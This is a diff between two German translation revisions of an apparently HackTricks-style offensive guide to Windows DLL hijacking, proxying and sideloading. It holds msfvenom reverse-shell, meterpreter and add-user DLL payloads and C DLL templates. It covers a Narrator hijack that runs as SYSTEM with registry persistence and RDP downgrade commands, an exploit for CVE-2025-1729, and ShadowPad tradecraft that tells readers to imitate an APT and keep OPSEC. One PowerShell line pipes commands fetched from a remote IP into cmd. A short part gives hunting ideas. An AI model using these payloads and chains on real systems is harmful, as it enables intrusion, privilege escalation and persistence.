+- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit** direkt über die Konfiguration deaktiviert, statt dass das implant `EtwEventWrite` im Speicher patcht.
 
-Betrieblicher Ablauf, der in jüngeren Kampagnen beobachtet wurde:
+Operationelles Muster aus aktuellen Kampagnen:
 - Stage 1 legt `setup.exe`, `setup.exe.config` und lokale assemblies ab.
-- Stage 2 kopiert sie in einen glaubwürdigen **AppData update**-Ordner, benennt den Host in etwas wie `update.exe` um und startet ihn erneut über einen **scheduled task**.
-- Stage 3 prüft den Ausführungskontext (z. B. erwarteter Parent `svchost.exe` von Task Scheduler), bevor die finale RAT DLL/export geladen wird.
+- Stage 2 kopiert sie in einen glaubwürdigen **AppData update**-Ordner, benennt den Host in etwas wie `update.exe` um und startet ihn erneut per **scheduled task**.
+- Stage 3 prüft den execution context (zum Beispiel den erwarteten Parent `svchost.exe` von Task Scheduler), bevor das finale RAT DLL/export geladen wird.
 
-Hunting ideas:
-- Signierte oder anderweitig legitime **.NET executables**, die mit verdächtigen benachbarten **`.config`**-Dateien an benutzerbeschreibbaren Speicherorten laufen.
+Hunting-Ideen:
+- Signierte oder anderweitig legitime **.NET executables**, die mit verdächtigen benachbarten **`.config`**-Dateien in user-writable locations laufen.
 - `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
 - Scheduled tasks, die umbenannte Update-Binaries aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen `\bin\update\`-Verzeichnissen erneut starten.
-- Parent/child-Ketten, bei denen ein scheduled task einen vertrauenswürdigen .NET-Host startet, der sofort nicht-vendor assemblies aus seinem eigenen Verzeichnis lädt.
+- Parent/child chains, bei denen ein scheduled task einen vertrauenswürdigen .NET-Host startet, der sofort nicht-vendor assemblies aus seinem eigenen Verzeichnis lädt.
 
 #### Exceptions on dll search order from Windows docs
 
-Bestimmte Ausnahmen zur standardmäßigen DLL search order sind in der Windows-Dokumentation vermerkt:
+Bestimmte Ausnahmen zur standardmäßigen DLL search order werden in der Windows-Dokumentation genannt:
 
-- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene DLL hat**, gefunden wird, umgeht das System die übliche Suche. Stattdessen prüft es Redirection und ein manifest, bevor es standardmäßig die bereits im Speicher befindliche DLL verwendet. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
-- Falls die DLL als **known DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System deren Version der known DLL samt aller abhängigen DLLs und **verzichtet auf den Suchprozess**. Der Registry-Schlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
-- Wenn eine **DLL Abhängigkeiten** hat, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie nur durch ihre **module names** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.
+- Wenn eine **DLL, die denselben Namen hat wie eine bereits im Speicher geladene**, gefunden wird, umgeht das System die übliche Suche. Stattdessen prüft es Redirecting und ein Manifest, bevor es auf die bereits im Speicher befindliche DLL zurückfällt. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
+- Falls die DLL für die aktuelle Windows-Version als **known DLL** erkannt wird, verwendet das System seine Version der known DLL samt ihrer abhängigen DLLs und **überspringt den Suchprozess**. Der Registry-Key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
+- Falls eine **DLL Abhängigkeiten** hat, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie nur über ihre **module names** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.
 
 ### Escalating Privileges
 
 **Requirements**:
 
-- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontal or lateral movement), dem **eine DLL fehlt**.
-- Stelle sicher, dass **Schreibzugriff** auf jedes **Verzeichnis** vorhanden ist, in dem nach der **DLL** gesucht wird. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis innerhalb des system path sein.
+- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontal or lateral movement), dem eine **DLL** fehlt.
+- Stelle sicher, dass **write access** für jedes **Verzeichnis** vorhanden ist, in dem nach der **DLL** gesucht wird. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis innerhalb des system path sein.
 
-Ja, die Voraussetzungen sind kompliziert zu finden, denn **standardmäßig ist es ziemlich ungewöhnlich, eine privilegierte ausführbare Datei zu finden, der eine dll fehlt**, und es ist sogar **noch ungewöhnlicher, Schreibrechte auf einen system path-Ordner zu haben** (standardmäßig nicht möglich). Aber in falsch konfigurierten Umgebungen ist das möglich.\
-Wenn du Glück hast und die Anforderungen erfüllst, kannst du das Projekt [UACME](https://github.com/hfiref0x/UACME) prüfen. Auch wenn das **Hauptziel des Projekts das Bypass UAC** ist, findest du dort möglicherweise einen **PoC** eines Dll hijaking für die Windows-Version, den du verwenden kannst (wahrscheinlich nur mit Anpassung des Pfads des Ordners, für den du Schreibrechte hast).
+Ja, die Voraussetzungen sind kompliziert zu finden, denn **standardmäßig ist es ziemlich ungewöhnlich, eine privilegierte ausführbare Datei zu finden, der eine dll fehlt**, und es ist sogar **noch ungewöhnlicher, Schreibrechte auf einen Ordner im system path zu haben** (das hat man standardmäßig nicht). Aber in fehlkonfigurierten Umgebungen ist das möglich.\
+Wenn du Glück hast und die Anforderungen erfüllst, kannst du das [UACME](https://github.com/hfiref0x/UACME)-Projekt prüfen. Auch wenn das **Hauptziel des Projekts das Umgehen von UAC** ist, findest du dort möglicherweise einen **PoC** eines Dll hijaking für die Windows-Version, den du verwenden kannst (wahrscheinlich nur durch Anpassen des Pfads des Ordners, für den du Schreibrechte hast).
 
-Beachte, dass du **deine Berechtigungen in einem Ordner prüfen** kannst, indem du:
+Beachte, dass du deine **Berechtigungen in einem Ordner prüfen** kannst, indem du:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
@@ -314,7 +342,7 @@ Du kannst auch die imports einer ausführbaren Datei und die exports einer dll m
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Für einen vollständigen Leitfaden dazu, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren**, mit Berechtigungen zum Schreiben in einen **System Path**-Ordner, siehe:
+For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:
 
 
 {{#ref}}
@@ -323,21 +351,21 @@ writable-sys-path-dll-hijacking-privesc.md
 
 ### Automated tools
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibrechte auf irgendeinen Ordner innerhalb des system PATH hast.\
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibrechte auf irgendeinem Ordner innerhalb des system PATH hast.\
 Andere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind die **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._
 
 ### Example
 
-Falls du ein ausnutzbares Szenario findest, wäre eine der wichtigsten Dinge für einen erfolgreichen Exploit, **eine dll zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importieren wird**. Beachte aber, dass Dll Hijacking nützlich ist, um [von Medium Integrity level zu High zu eskalieren (**UAC bypass**)](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Du findest ein Beispiel dafür, **wie man eine gültige dll erstellt**, in dieser Studie zu dll hijacking mit Fokus auf Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Außerdem findest du im **nächsten Abschnitt** einige **einfache dll codes**, die als **Templates** nützlich sein können oder um eine **dll mit nicht erforderlichen exportierten Funktionen** zu erstellen.
+Falls du ein ausnutzbares Szenario findest, gehört zu den wichtigsten Dingen, um es erfolgreich auszunutzen, eine **dll zu erstellen, die mindestens alle Funktionen exportiert, die das Executable von ihr importieren wird**. Hinweis: Dll Hijacking ist außerdem nützlich, um von [Medium Integrity level zu High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Du findest ein Beispiel dafür, **wie man eine gültige dll erstellt**, in dieser auf dll hijacking für execution fokussierten Untersuchung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Außerdem findest du im **nächsten Abschnitt** einige **grundlegende dll-Codes**, die als **Vorlagen** nützlich sein können oder um eine **dll mit nicht benötigten exportierten Funktionen** zu erstellen.
 
 ## **Creating and compiling Dlls**
 
 ### **Dll Proxifying**
 
-Im Grunde ist ein **Dll proxy** eine Dll, die **deinen bösartigen code ausführen kann, wenn sie geladen wird**, aber auch dazu dient, sich **zu exponieren** und **zu funktionieren** wie erwartet, indem **alle Aufrufe an die echte library weitergeleitet werden**.
+Grundsätzlich ist ein **Dll proxy** eine Dll, die fähig ist, **deinen bösartigen Code auszuführen, wenn sie geladen wird**, aber auch **offenzulegen** und **zu funktionieren** wie **erwartet**, indem sie **alle Aufrufe an die echte Library weiterleitet**.
 
-Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **eine ausführbare Datei angeben und die library auswählen**, die du proxifyen willst, und **eine proxified dll erzeugen** oder **die Dll angeben** und **eine proxified dll erzeugen**.
+Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **ein Executable angeben und die Library auswählen**, die du proxifizieren möchtest, und **eine proxified dll generieren** oder **die Dll angeben** und **eine proxified dll generieren**.
 
 ### **Meterpreter**
 
@@ -345,17 +373,17 @@ Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Einen meterpreter (x86) erhalten:**
+**Erhalte einen meterpreter (x86):**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Einen User erstellen (x86, ich habe keine x64-Version gesehen):**
+**Einen Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**
 ```bash
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### Dein eigenes
+### Eigene
 
-Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren** muss, die vom Opferprozess geladen werden; wenn diese Funktionen nicht existieren, wird die **Binary sie nicht laden können** und der **Exploit wird fehlschlagen**.
+Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren** muss, die vom Opferprozess geladen werden. Wenn diese Funktionen nicht existieren, kann das **Binary sie nicht laden** und der **Exploit wird fehlschlagen**.
 
 <details>
 <summary>C DLL template (Win10)</summary>
@@ -394,7 +422,7 @@ return TRUE;
 }
 ```
 <details>
-<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
+<summary>C++ DLL-Beispiel mit User-Erstellung</summary>
 ```c
 //x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
 //x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
@@ -417,7 +445,7 @@ return 0;
 </details>
 
 <details>
-<summary>Alternative C DLL mit thread entry</summary>
+<summary>Alternative C DLL mit Thread-Einstiegspunkt</summary>
 ```c
 //Another possible DLL
 // i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll
@@ -445,18 +473,18 @@ return TRUE;
 ```
 </details>
 
-## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
+## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
 
-Windows Narrator.exe prüft beim Start weiterhin eine vorhersagbare, sprachspezifische Localization DLL, die für arbitrary code execution und persistence hijacked werden kann.
+Windows Narrator.exe prüft beim Start weiterhin eine vorhersagbare, sprachspezifische Localization-DLL, die für beliebigen Code Execution und Persistence hijacked werden kann.
 
 Wichtige Fakten
 - Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
 - Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
-- Wenn eine schreibbare, attacker-controlled DLL am OneCore path existiert, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es sind keine exports erforderlich.
+- Wenn eine beschreibbare, attacker-kontrollierte DLL am OneCore path existiert, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Exports sind nicht erforderlich.
 
 Discovery with Procmon
-- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
-- Starte Narrator und beobachte den Ladeversuch des obigen Pfads.
+- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
+- Start Narrator und beobachte den Ladeversuch des obigen path.
 
 Minimal DLL
 ```c
@@ -471,39 +499,39 @@ return TRUE;
 }
 ```
 OPSEC silence
-- Ein naiver hijack wird UI sprechen/hervorheben. Um ruhig zu bleiben, bei attach die Narrator-Threads enumerieren, den Main-Thread mit (`OpenThread(THREAD_SUSPEND_RESUME)`) öffnen und ihn mit `SuspendThread` anhalten; in deinem eigenen Thread weitermachen. Siehe PoC für den vollständigen Code.
+- Ein naiver hijack wird UI ausgeben/hervorheben. Um still zu bleiben, beim attach die Narrator-Threads enumerieren, den Main-Thread (`OpenThread(THREAD_SUSPEND_RESUME)`) öffnen und mit `SuspendThread` anhalten; in deinem eigenen Thread fortfahren. Siehe PoC für den vollständigen Code.
 
-Trigger and persistence via Accessibility configuration
+Trigger und Persistence über Accessibility-Konfiguration
 - User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
 - Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
-- Mit dem oben Genannten lädt das Starten von Narrator die platzierte DLL. Auf dem secure desktop (logon screen) drücke CTRL+WIN+ENTER, um Narrator zu starten; deine DLL führt dann als SYSTEM auf dem secure desktop aus.
+- Mit dem Obigen lädt das Starten von Narrator die platzierte DLL. Auf dem secure desktop (logon screen) drücke CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem secure desktop ausgeführt.
 
-RDP-triggered SYSTEM execution (lateral movement)
+RDP-triggerte SYSTEM-Ausführung (lateral movement)
 - Klassische RDP security layer erlauben: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
-- Per RDP auf den Host verbinden, am logon screen CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL führt dann als SYSTEM auf dem secure desktop aus.
-- Die Ausführung stoppt, wenn die RDP-Sitzung geschlossen wird—schnell injizieren/migrieren.
+- Per RDP zum Host verbinden, am logon screen CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL wird als SYSTEM auf dem secure desktop ausgeführt.
+- Die Ausführung stoppt, wenn die RDP-Sitzung geschlossen wird—also schnell inject/migrate.
 
 Bring Your Own Accessibility (BYOA)
-- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf eine beliebige binary/DLL zeigt, ihn importieren und dann `configuration` auf diesen AT-Namen setzen. Das vermittelt beliebige Ausführung unter dem Accessibility framework.
+- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf ein beliebiges Binary/DLL zeigt, importieren und dann `configuration` auf diesen AT-Namen setzen. Das proxyt beliebige Ausführung unter dem Accessibility framework.
 
 Notes
-- Das Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
-- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` liegen; Exports werden nicht benötigt.
+- Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
+- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` liegen; keine Exports sind nötig.
 
 ## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe
 
-Dieses Case Study zeigt **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), verfolgt als **CVE-2025-1729**.
+Dieses Beispiel zeigt **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.
 
 ### Vulnerability Details
 
 - **Component**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
 - **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` läuft täglich um 9:30 AM unter dem Kontext des angemeldeten Users.
-- **Directory Permissions**: Schreibbar für `CREATOR OWNER`, wodurch lokale User beliebige Dateien ablegen können.
-- **DLL Search Behavior**: Versucht zuerst, `hostfxr.dll` aus seinem Arbeitsverzeichnis zu laden, und protokolliert "NAME NOT FOUND", falls sie fehlt, was auf eine lokale Verzeichnis-Suche mit Vorrang hinweist.
+- **Directory Permissions**: Schreibbar durch `CREATOR OWNER`, wodurch lokale Users beliebige Dateien ablegen können.
+- **DLL Search Behavior**: Versucht, `hostfxr.dll` zuerst aus seinem Arbeitsverzeichnis zu laden und protokolliert "NAME NOT FOUND", wenn sie fehlt, was auf Priorität der lokalen Verzeichnissuche hinweist.
 
 ### Exploit Implementation
 
-Ein Angreifer kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis platzieren und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Users zu erreichen:
+Ein Angreifer kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis platzieren und die fehlende DLL ausnutzen, um Codeausführung unter dem Kontext des Users zu erreichen:
 ```c
 #include <windows.h>
 
@@ -518,27 +546,27 @@ return TRUE;
 ### Attack Flow
 
 1. Als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
-2. Warten, bis die geplante Aufgabe um 9:30 AM im Kontext des aktuellen Benutzers ausgeführt wird.
-3. Wenn beim Ausführen der Aufgabe ein Administrator angemeldet ist, läuft die bösartige DLL in der Session des Administrators mit mittlerer Integrität.
-4. Standard-UAC-bypass-Techniken verketten, um von mittlerer Integrität zu SYSTEM-Privilegien zu eskalieren.
+2. Warten, bis der geplante Task um 9:30 AM im Kontext des aktuellen Benutzers ausgeführt wird.
+3. Wenn ein Administrator angemeldet ist, wenn der Task ausgeführt wird, läuft die bösartige DLL in der Sitzung des Administrators mit medium integrity.
+4. Standard-UAC-bypass-Techniken verketten, um von medium integrity zu SYSTEM-Privilegien zu eskalieren.
 
 ## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)
 
 Threat actors kombinieren häufig MSI-basierte Dropper mit DLL side-loading, um Payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.
 
 Chain overview
-- User lädt MSI herunter. Eine CustomAction läuft während der GUI-Installation lautlos (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
-- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signierte wsc_proxy.exe + angreiferkontrollierte wsc.dll).
-- Wenn die signierte EXE gestartet wird, lädt die Windows DLL search order wsc.dll zuerst aus dem working directory und führt den Angreifercode unter einem signierten Parent aus (ATT&CK T1574.001).
+- User lädt MSI herunter. Eine CustomAction läuft während der GUI-Installation still im Hintergrund (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stage aus eingebetteten Ressourcen.
+- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signierte wsc_proxy.exe + angriffs-gesteuerte wsc.dll).
+- Wenn die signierte EXE gestartet wird, lädt die Windows DLL-Suchreihenfolge zuerst wsc.dll aus dem Arbeitsverzeichnis und führt den Code des Angreifers unter einem signierten Parent aus (ATT&CK T1574.001).
 
 MSI analysis (what to look for)
 - CustomAction table:
-- Achte auf Einträge, die ausführbare Dateien oder VBScript ausführen. Verdächtiges Beispielmuster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
-- In Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary prüfen.
-- Eingebettete/aufgeteilte Payloads in der MSI CAB:
-- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
-- Oder lessmsi verwenden: lessmsi x package.msi C:\out
-- Achte auf mehrere kleine Fragmente, die durch eine VBScript CustomAction zusammengefügt und entschlüsselt werden. Typischer Ablauf:
+- Suche nach Einträgen, die Executables oder VBScript ausführen. Verdächtiges Beispielmuster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
+- In Orca (Microsoft Orca.exe), prüfe CustomAction, InstallExecuteSequence und Binary tables.
+- Eingebettete/gesplittete Payloads im MSI CAB:
+- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
+- Oder benutze lessmsi: `lessmsi x package.msi C:\out`
+- Suche nach mehreren kleinen Fragmenten, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Häufiger Ablauf:
 ```vb
 ' VBScript CustomAction (high level)
 ' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
@@ -548,9 +576,9 @@ MSI analysis (what to look for)
 ```
 Praktisches sideloading mit wsc_proxy.exe
 - Lege diese zwei Dateien in denselben Ordner:
-- wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll per Namen aus seinem Verzeichnis zu laden.
-- wsc.dll: Angreifer-DLL. Wenn keine speziellen Exports erforderlich sind, kann DllMain ausreichen; andernfalls erstelle eine proxy DLL und leite die benötigten Exports an die echte Bibliothek weiter, während die payload in DllMain ausgeführt wird.
-- Erstelle eine minimale DLL-payload:
+- wsc_proxy.exe: legitim signierter Host (Avast). Der Prozess versucht, wsc.dll per Namen aus seinem Verzeichnis zu laden.
+- wsc.dll: Angreifer-DLL. Wenn keine spezifischen exports erforderlich sind, kann DllMain ausreichen; andernfalls erstelle eine Proxy DLL und leite die erforderlichen exports an die echte Bibliothek weiter, während die Payload in DllMain ausgeführt wird.
+- Erstelle eine minimale DLL-Payload:
 ```c
 // x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
 #include <windows.h>
@@ -561,106 +589,106 @@ WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
 return TRUE;
 }
 ```
-- Für Export-Anforderungen verwende ein proxying framework (z. B. DLLirant/Spartacus), um eine Forwarding-DLL zu erzeugen, die außerdem dein Payload ausführt.
+- Für export requirements, verwende ein proxying framework (z. B. DLLirant/Spartacus), um eine forwarding DLL zu erzeugen, die auch dein payload ausführt.
 
-- Diese Technik beruht auf der DLL-Name-Resolution durch die Host-Binary. Wenn der Host absolute Pfade oder sichere Loading-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der hijack fehlschlagen.
-- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binary und des Export-Sets berücksichtigt werden.
+- Diese Technik beruht auf DLL name resolution durch das host binary. Wenn der Host absolute Pfade oder safe loading flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der hijack fehlschlagen.
+- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl des host binary und des export set berücksichtigt werden.
 
 ## Signed triads + encrypted payloads (ShadowPad case study)
 
-Check Point beschrieb, wie Ink Dragon ShadowPad mit einer **three-file triad** ausliefert, um sich unter legitimer Software zu verstecken und gleichzeitig das Core-Payload verschlüsselt auf der Festplatte zu halten:
+Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Drei-Dateien-Triade** ausliefert, um sich an legitime software anzupassen und gleichzeitig das core payload verschlüsselt auf disk zu halten:
 
-1. **Signed host EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die Executable so um, dass sie wie eine Windows-Binary aussieht (zum Beispiel `conhost.exe`), aber die Authenticode-Signatur bleibt gültig.
-2. **Malicious loader DLL** – wird neben der EXE mit einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist normalerweise eine MFC-Binary, die mit dem ScatterBrain framework obfuskiert ist; ihre einzige Aufgabe ist es, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad reflectively zu laden.
-3. **Encrypted payload blob** – wird oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem das entschlüsselte Payload per memory-mapping geladen wurde, löscht der Loader die TMP-Datei, um forensische Beweise zu vernichten.
+1. **Signed host EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei um, sodass sie wie eine Windows binary aussieht (zum Beispiel `conhost.exe`), aber die Authenticode signature bleibt gültig.
+2. **Malicious loader DLL** – neben die EXE mit einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist normalerweise eine MFC binary, die mit dem ScatterBrain framework obfuskiert ist; ihre einzige Aufgabe ist es, den verschlüsselten blob zu finden, ihn zu entschlüsseln und ShadowPad reflectively zu mappen.
+3. **Encrypted payload blob** – oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem das entschlüsselte payload in memory gemappt wurde, löscht der Loader die TMP-Datei, um forensic evidence zu zerstören.
 
 Tradecraft notes:
 
-* Das Umbenennen der signierten EXE (während das ursprüngliche `OriginalFileName` im PE-Header erhalten bleibt) lässt sie wie eine Windows-Binary erscheinen und trotzdem die Vendor-Signatur behalten; repliziere also Ink Dragons Vorgehen, `conhost.exe`-ähnliche Binaries abzulegen, die in Wirklichkeit AMD/NVIDIA-Utilities sind.
-* Da die Executable weiterhin als vertrauenswürdig gilt, müssen die meisten Allowlisting-Kontrollen nur deine malicious DLL neben ihr sehen. Konzentriere dich darauf, die Loader DLL anzupassen; der signierte Parent kann normalerweise unverändert bleiben.
-* ShadowPads decryptor erwartet, dass der TMP-Blob neben dem Loader liegt und schreibbar ist, damit die Datei nach dem Mapping auf null gesetzt werden kann. Lass das Verzeichnis schreibbar, bis das Payload geladen ist; sobald es im Speicher liegt, kann die TMP-Datei für OPSEC sicher gelöscht werden.
+* Das Umbenennen der signierten EXE (während das ursprüngliche `OriginalFileName` im PE header erhalten bleibt) lässt sie sich als Windows binary ausgeben und trotzdem die vendor signature behalten, daher sollte Ink Dragons Vorgehen nachgeahmt werden, indem `conhost.exe`-ähnliche binaries abgelegt werden, die in Wirklichkeit AMD/NVIDIA utilities sind.
+* Da die ausführbare Datei vertrauenswürdig bleibt, müssen die meisten allowlisting controls nur deine malicious DLL neben ihr liegen haben. Konzentriere dich darauf, die loader DLL anzupassen; der signierte Parent kann in der Regel unverändert laufen.
+* ShadowPads decryptor erwartet, dass der TMP blob neben dem Loader liegt und schreibbar ist, damit die Datei nach dem Mapping auf null gesetzt werden kann. Halte das Verzeichnis schreibbar, bis das payload geladen ist; sobald es im memory ist, kann die TMP-Datei sicher gelöscht werden, um die OPSEC zu verbessern.
 
 ### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)
 
-Operatoren kombinieren DLL sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf der Festplatte die malicious DLL neben der vertrauenswürdigen EXE ist:
+Operatoren kombinieren DLL sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf disk die malicious DLL neben der vertrauenswürdigen EXE ist:
 
-- **Remote command loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, zieht Befehle von einem Finger-Server und piped sie an `cmd`:
+- **Remote command loader (Finger):** Hidden PowerShell startet `cmd.exe /c`, zieht Befehle von einem Finger server und leitet sie an `cmd` weiter:
 
 ```powershell
 powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
 ```
-- `finger user@host` zieht TCP/79-Text; `| cmd` führt die Server-Antwort aus und ermöglicht es Operatoren, den zweiten Stage serverseitig zu rotieren.
+- `finger user@host` zieht TCP/79 text; `| cmd` führt die Antwort des Servers aus und erlaubt den Operatoren, den zweiten stage serverseitig zu wechseln.
 
